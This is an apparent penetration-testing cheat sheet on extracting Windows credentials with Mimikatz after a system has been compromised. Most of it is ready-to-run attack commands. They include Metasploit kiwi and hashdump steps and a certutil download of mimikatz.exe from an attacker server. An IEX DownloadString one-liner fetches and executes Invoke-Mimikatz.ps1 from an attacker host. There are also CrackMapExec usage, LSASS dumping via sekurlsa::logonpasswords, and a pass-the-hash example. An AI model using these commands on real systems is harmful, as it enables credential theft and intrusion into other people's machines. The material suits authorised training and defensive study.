# Mimikatz

**Mimikatz** is a Windows post-exploitation tool. It allows fot the extraction of clear-text passwords, hashes and kerberos tickets from memory.

**Required**:

* **pwd the target** with shell/meterpreter
* login with a **high privilege account**



## Transfer to target



<pre class="language-bash" data-title="Metasploit module"><code class="lang-bash"># load the kiwi module
load kiwi

# get help menu
?

# retrieve all credentials with kiwi
creds_all

<strong># dump from SAM db
</strong>lsa_dump_sam
</code></pre>



{% code title="Metasploit" %}
```bash
use post/windows/gather/hashdump
set SESSION
run
```
{% endcode %}



{% code title="PS shell" %}
```powershell
# create a 'Temp' dir on Target Machine
mkdir Temp

# cp mimikatz file and host server in attack machine on port 80
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
python3 -m http.server 80

# download .exe from attack machine
certutil -urlcache -f http://IP:80/mimikatz.exe mimikatz.exe
```
{% endcode %}



{% code title="meterpreter & mimikatz.exe" %}
```powershell
# create a 'Temp' dir
mkdir Temp

# upload .exe from meterpreter to target machine
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe

# execute the program via shell in the target machine
.\mimikatz.exe

# check required privileges
privilege::debug

# lsa dump from SAM db
lsadump::sam

# show clear-text passwords
sekurlsa::logonpasswords
```
{% endcode %}



## MimiKatz into PowerShell RevShell

Stablished a connection with Hoaxshell

[#hoaxshell](../../pt/executive-pt/post-exploitation/shells.md#hoaxshell "mention")

{% code overflow="wrap" %}
```bash
wget https://raw.githubusercontent.com/PowershellMafia/Powersploit/refs/heads/master/Exfiltration/Invoke-Mimikatz.ps1
```
{% endcode %}

Host a webserver with the module Invoke-Mimikatz.ps1

```
python3 -m http.server 80
```

Run this command to import the mimikatz module from attacker webserver and use it.

{% code overflow="wrap" %}
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://<ATT_IP>:<ATT_PORT>/Invoke-Mimikatz.ps1');Invoke-Mimikatz -Command '"PRIVILEGE::Debug"'
```
{% endcode %}



## Mimikatz with CrackMapExec

```bash
crackmapexec smb <IP> -u USER -p PASSWORD -M mimikatz
```



## Credentials Dump

### NTLM

```powershell
```



## Methods

{% embed url="https://tools.thehacker.recipes/mimikatz" %}

### sekurlsa

The **sekurlsa** module in Mimikatz, leverages a number of different techniques to extract authentication information from _**LSASS**_ memory including parsing memory structures and using Windows APIs.

#### "logonpasswords"&#x20;

The "logonpasswords" function of this module specifically extracts login session data such as saved password hashes and cached credentials. This can include the current user's logon information, as well as information for other users who have logged onto the same machine.

Example:

```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

#### "pth"

The "sekurlsa::pth" command in mimikatz is a features that facilitates "Pass-the-Hash" attacks. This technique allows us to authenticate to a remote system by using a captured NTLM hash of a user's password, without the need for the actual password. To execute this command, we must provide only the following parameters:

* **/user**: (the username)
* **/domain**: (the domain)
* **/ntlm**: (the NTLM hash of the user's password)

{% hint style="info" %}
Note that Windows passwords are not only limited to the NTLM protocol, but may also use popular block encryption algorithms like AES-128 and AES-256 for password storage. In such cases, adversaries would need to use the _**/aes128**_: or _**/aes256**_: parameters instead of _**/ntlm**_:
{% endhint %}

Example:

{% code overflow="wrap" %}
```powershell
.\mimikatz.exe "sekurlsa::pth /user:Alice /domain:domain.com /ntlm:a0c8746a6efc7782c7c19c55185145be"
```
{% endcode %}



### privilege

Administrators typically have SeDebugPrivilege, enabling them to debug programs. This privilege can be restricted to prevent unauthorized memory dumps, a common technique used by attackers to extract credentials from memory. However, even with this privilege removed, the TrustedInstaller account can still perform memory dumps using a customized service configuration

#### "debug"

Before run the "sekurlsa::logonpasswords" function, we need to run the "privilege::debug" command.

By default, LSASS runs with high integrity and is protected from being debugged by unauthorized processes. However, by enabling the "_**debugger privilege**_" function, we can bypass this protection and access LSASS memory to extract the logon session data.

















